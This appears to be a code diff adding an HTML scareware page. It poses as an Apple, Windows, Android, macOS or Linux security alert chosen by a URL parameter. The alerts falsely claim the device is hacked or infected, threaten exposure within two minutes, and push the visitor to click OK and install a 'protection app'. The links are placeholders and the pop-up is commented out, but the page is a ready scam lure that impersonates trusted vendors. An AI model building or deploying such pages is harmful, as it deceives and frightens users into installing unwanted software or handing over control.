@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple Security Alert</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            color: #333;
+            text-align: center;
+        }
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+            max-width: 600px;
+            margin: 20px;
+        }
+        h1 {
+            color: #d9534f; /* A red color for alert */
+            margin-bottom: 20px;
+        }
+        p {
+            line-height: 1.6;
+            margin-bottom: 15px;
+        }
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 20px;
+            font-size: 1.2em;
+            font-weight: bold;
+            color: #555;
+        }
+        .header .logo {
+            width: 30px;
+            height: 30px;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+        .header .title {
+            /* Any specific styling for the title text */
+        }
+        a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+    <div class="header">
+        <img src="apple.png" alt="OS Logo" class="logo" id="header-logo">
+        <div class="title" id="header-title">
+            Apple security
+        </div>
+    </div>
+        <h1 id="main-heading"></h1> 
+         <p id="main-message"></p> 
+         <p id="secondary-message"></p> 
+         <p id="call-to-action"></p> 
+         <p><a href="#" id="protection-link"></a></p>
+    </div>
+
+    <script> 
+         document.addEventListener('DOMContentLoaded', function() { 
+             const urlParams = new URLSearchParams(window.location.search); 
+             const os = urlParams.get('os'); 
+  
+             const mainHeading = document.getElementById('main-heading'); 
+             const mainMessage = document.getElementById('main-message'); 
+             const secondaryMessage = document.getElementById('secondary-message'); 
+             const callToAction = document.getElementById('call-to-action'); 
+             const protectionLink = document.getElementById('protection-link');
+             const headerLogo = document.getElementById('header-logo');
+             const headerTitle = document.getElementById('header-title');
+  
+             let alertMessage = "Your device might be at risk. Immediate action is required!";
+  
+             if (os === 'iOS') {
+                 headerLogo.src =  "https://i.pinimg.com/webp70/736x/60/6b/c0/606bc0717982547e555a514b479365a0.webp"; // Apple URL
+                 headerTitle.textContent = "Apple Security";
+                 mainHeading.textContent = "Hackers are watching you!";
+                 mainMessage.textContent = "Your Apple iPhone connection has been hacked and someone is watching on you! Please do not close this page. If you don't fix this in two minutes, the hacker will reveal your identity and track your movements.";
+                 secondaryMessage.innerHTML = "<strong>Step 1:</strong> Do not panic.<br><strong>Step 2:</strong> Click \"OK\" on the alert to proceed.<br><strong>Step 3:</strong> Install and run the recommended protection app to recover your Apple iPhone.";
+                 callToAction.textContent = ""; // No specific call to action text here, it's part of secondaryMessage
+                 protectionLink.textContent = "Protect your connection";
+                 protectionLink.href = "#";
+                 alertMessage = "Your Apple iPhone has been hacked. All operations on your device are being tracked by the hacker. Immediate action is required!";
+             } else if (os === 'Windows') {
+                 headerLogo.src = "https://i.pinimg.com/736x/a6/58/b9/a658b9eb2a14b9c5a2f1c34e0e1a1aed.jpg"; // Windows URL
+                 headerTitle.textContent = "Windows Security";
+                 mainHeading.textContent = "Windows Security Alert!";
+                 mainMessage.textContent = "Your Windows system might be compromised. We detected suspicious activity on your network connection. Do not close this page.";
+                 secondaryMessage.innerHTML = "<strong>Action Required:</strong> Click \"OK\" to scan your system and remove threats. Failure to act may result in data loss.";
+                 callToAction.textContent = "";
+                 protectionLink.textContent = "Scan and Protect Now";
+                 protectionLink.href = "#";
+                 alertMessage = "Suspicious activity detected on your Windows system. Click OK to proceed with security scan.";
+             } else if (os === 'Android') {
+                 headerLogo.src = "https://i.pinimg.com/736x/da/72/eb/da72eb03a52da0f7679fb72969f665e4.jpg"; // Android URL
+                 headerTitle.textContent = "Android Security";
+                 mainHeading.textContent = "Android Threat Detected!";
+                 mainMessage.textContent = "Your Android device is at high risk! Malware has been detected. Your personal data may be exposed.";
+                 secondaryMessage.innerHTML = "<strong>Immediate Action:</strong> Tap \"OK\" to clean your device and secure your data. Ignoring this alert will lead to further damage.";
+                 callToAction.textContent = "";
+                 protectionLink.textContent = "Clean My Android";
+                 protectionLink.href = "#";
+                 alertMessage = "Malware detected on your Android device. Tap OK to remove it.";
+             } else if (os === 'macOS') {
+                 headerLogo.src = "https://i.pinimg.com/736x/d9/55/46/d955461ed7ade9ca008d698e44344e45.jpg"; // macOS URL
+                 headerTitle.textContent = "macOS Security";
+                 mainHeading.textContent = "macOS Security Warning!";
+                 mainMessage.textContent = "Your macOS system has detected potential threats. Unauthorized access attempts were logged. Your privacy is at risk.";
+                 secondaryMessage.innerHTML = "<strong>Recommendation:</strong> Click \"OK\" to initiate a security check and restore system integrity.";
+                 callToAction.textContent = "";
+                 protectionLink.textContent = "Secure My Mac";
+                 protectionLink.href = "#";
+                 alertMessage = "Potential security threats detected on your macOS. Click OK to perform a security check.";
+             } else if (os === 'Linux') {
+                 headerLogo.src = "https://i.pinimg.com/736x/13/20/a6/1320a61a531ebaf7414d2cbc528f2847.jpg"; // Linux URL
+                 headerTitle.textContent = "Linux Security";
+                 mainHeading.textContent = "Linux System Alert!";
+                 mainMessage.textContent = "Your Linux system integrity might be compromised. Unusual network traffic detected. Your data could be vulnerable.";
+                 secondaryMessage.innerHTML = "<strong>Urgent:</strong> Click \"OK\" to run a system diagnostic and secure your connection.";
+                 callToAction.textContent = "";
+                 protectionLink.textContent = "Run Diagnostics";
+                 protectionLink.href = "#";
+                 alertMessage = "Unusual activity on your Linux system. Click OK to run diagnostics.";
+             }
+             else {
+                 // Default message for unknown or other OS
+                 headerLogo.src = "https://i.pinimg.com/736x/09/bc/36/09bc3671eb22d6b80ab8d2a9f82a734e.jpg"; // Default URL
+                 headerTitle.textContent = "Security Alert";
+                 mainHeading.textContent = "Security Alert!";
+                 mainMessage.textContent = "Your device connection might be at risk. We recommend taking immediate action to protect your data.";
+                 secondaryMessage.innerHTML = "<strong>Action Required:</strong> Click \"OK\" to proceed with recommended security measures.";
+                 callToAction.textContent = "";
+                 protectionLink.textContent = "Secure My Device";
+                 protectionLink.href = "#";
+             } 
+  
+             // Display the alert after content is set 
+             // alert(alertMessage); 
+         }); 
+     </script>
+</body>
+</html>
